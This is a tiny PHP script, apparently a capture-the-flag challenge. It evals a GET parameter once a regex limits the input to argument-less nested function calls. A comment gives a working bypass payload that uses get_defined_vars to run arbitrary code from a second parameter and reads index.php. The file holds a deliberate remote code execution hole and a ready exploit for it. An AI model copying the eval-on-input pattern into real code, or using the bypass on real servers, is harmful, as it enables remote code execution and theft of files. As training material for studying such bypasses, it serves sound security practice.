<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', @$_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
#code=eval(end(current(get_defined_vars())));&a=var_dump(file_get_contents('index.php'));

#code=